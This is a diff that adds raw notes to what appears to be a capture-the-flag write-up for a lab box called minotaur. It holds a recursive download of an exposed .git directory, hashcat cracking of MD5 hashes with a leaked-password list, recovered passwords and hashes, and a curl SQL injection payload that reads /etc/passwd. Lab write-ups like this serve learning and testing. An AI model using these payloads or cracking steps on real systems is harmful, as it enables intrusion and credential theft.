@@ -553,4 +553,108 @@ Not to forget, he forgets a lot of stuff, that's why he likes to keep things on 
 
 <br>
 
+<br>
+<br>
+<br>
+<br>
+
+
+```bash
+:# wget -r -np http://minotaur.thm/.git/
+
+```
+
+
+:~/minotaur.thm/.git# ls -lah
+total 88K
+drwxr-xr-x 8 root root 4.0K Jan  8 01:36  .
+drwxr-xr-x 3 root root 4.0K Jan  8 01:36  ..
+drwxr-xr-x 2 root root 4.0K Jan  8 01:36  branches
+-rw-r--r-- 1 root root  258 Jun 15  2021  config
+-rw-r--r-- 1 root root   73 Jun 15  2021  description
+-rw-r--r-- 1 root root   21 Jun 15  2021  HEAD
+drwxr-xr-x 2 root root 4.0K Jan  8 01:36  hooks
+-rw-r--r-- 1 root root 2.8K Jun 15  2021  index
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36  index.html
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=D;O=A'
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=D;O=D'
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=M;O=A'
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=M;O=D'
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=N;O=A'
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=N;O=D'
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=S;O=A'
+-rw-r--r-- 1 root root 2.9K Jan  8 01:36 'index.html?C=S;O=D'
+drwxr-xr-x 2 root root 4.0K Jan  8 01:36  info
+drwxr-xr-x 3 root root 4.0K Jan  8 01:36  logs
+drwxr-xr-x 4 root root 4.0K Jan  8 01:36  objects
+-rw-r--r-- 1 root root  418 Jun 15  2021  packed-refs
+drwxr-xr-x 5 root root 4.0K Jan  8 01:36  refs
+
+
+
+
+
+:~/minotaur.thm/.git/logs# ls -lah
+total 52K
+drwxr-xr-x 3 root root 4.0K Jan  8 01:36  .
+drwxr-xr-x 8 root root 4.0K Jan  8 01:36  ..
+-rw-r--r-- 1 root root  178 Jun 15  2021  HEAD
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36  index.html
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=D;O=A'
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=D;O=D'
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=M;O=A'
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=M;O=D'
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=N;O=A'
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=N;O=D'
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=S;O=A'
+-rw-r--r-- 1 root root 1.2K Jan  8 01:36 'index.html?C=S;O=D'
+drwxr-xr-x 4 root root 4.0K Jan  8 01:36  refs
+
+
+
+
+:~# git clone https://github.com/spayc/minotaur-box
+Cloning into 'minotaur-box'...
+remote: Enumerating objects: 587, done.
+remote: Total 587 (delta 0), reused 0 (delta 0), pack-reused 587 (from 1)
+Receiving objects: 100% (587/587), 1.75 MiB | 21.63 MiB/s, done.
+Resolving deltas: 100% (260/260), done.
+
+
+
+:~/minotaur-box# ls
+api  dbConnect.php  echo.php     imgs       jebait.html  License.txt  login.php   Minotaur-Box_Writeup.md  session.php
+css  dbCreate.sql   favicon.png  index.php  js           login.html   logout.php  README.md
+
+
+
+hashcat -m0 -a0 people /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+
+Eurycliedes
+Menekrates
+Philostratos
+Daedulus
+M!n0taur
+
+hashcat -m0 -a0 creatures /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+
+42354020b68c7ed28dcdeabd5a2baf8e
+0b3bebe266a81fbfaa79db1604c4e67f
+b83f966a6f5a9cff9c6e1c52b0aa635b
+b8e4c23686a3a12476d7779e35fa5eb6
+1765db9457f496a39859209ee81fbda4
+
+
+
+hashcat -m0 -a0 creatures /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+3898e56bf6fa6ddfc3c0977c514a65a8
+5d20441c392b68c61592b2159990abfe
+f847149233ae29ec0e1fcf052930c044
+ea5540126c33fe653bf56e7a686b1770
+
+curl -X POST http://minotaur.thm/api/people/search -d "namePeople=' UNION ALL SELECT NULL,NULL,load_file('/etc/passwd')-- -"
+		
 
